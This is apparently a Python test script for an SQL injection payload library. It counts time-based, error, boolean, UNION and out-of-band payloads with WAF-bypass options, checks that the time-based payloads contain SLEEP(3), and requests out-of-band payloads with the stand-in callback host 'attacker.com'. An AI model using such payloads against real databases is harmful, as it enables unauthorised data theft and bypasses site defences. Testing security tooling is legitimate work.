#!/usr/bin/env python3
"""Test script to verify SQL injection payload library."""

from exploit.payload_library.sqli import get_payloads

# Test 1: Count all MySQL payloads with WAF bypass
p_all = get_payloads("all", "mysql", waf_bypass=True, delay=5)
print(f"All MySQL payloads (with WAF bypass): {len(p_all)}")

# Test 2: Count time-based generic payloads with delay=3
p_time = get_payloads("time", "generic", delay=3)
print(f"Time-based generic: {len(p_time)}")

# Test 3: Verify assertions
assert len(p_all) > 50, f"Should have 50+ payloads, got {len(p_all)}"
print(f"✓ PASSED: MySQL payloads with WAF bypass > 50 (got {len(p_all)})")

assert any("SLEEP(3)" in p for p in p_time), "Should contain SLEEP(3)"
print("✓ PASSED: Time-based payloads contain SLEEP(3)")

# Test 4: Verify placeholder replacement
assert any("{delay}" not in p for p in p_time), "Placeholders should be replaced"
print("✓ PASSED: Placeholders are replaced")

# Test 5: Count error-based payloads
p_error = get_payloads("error", "mysql")
print(f"Error-based MySQL payloads: {len(p_error)}")

# Test 6: Count boolean-based payloads
p_boolean = get_payloads("boolean")
print(f"Boolean-based payloads: {len(p_boolean)}")

# Test 7: Count union-based payloads
p_union = get_payloads("union", "mssql")
print(f"UNION-based MSSQL payloads: {len(p_union)}")

# Test 8: Count OOB payloads
p_oob = get_payloads("oob", "postgresql", callback="attacker.com")
print(f"Out-of-band PostgreSQL payloads: {len(p_oob)}")

# Test 9: Show sample payloads for verification
print("\nSample payloads (first 5 from MySQL all techniques with WAF bypass):")
for i, payload in enumerate(p_all[:5], 1):
    print(f"  {i}. {payload}")

print("\n" + "="*70)
print("Payload library OK - All tests passed!")
print("="*70)
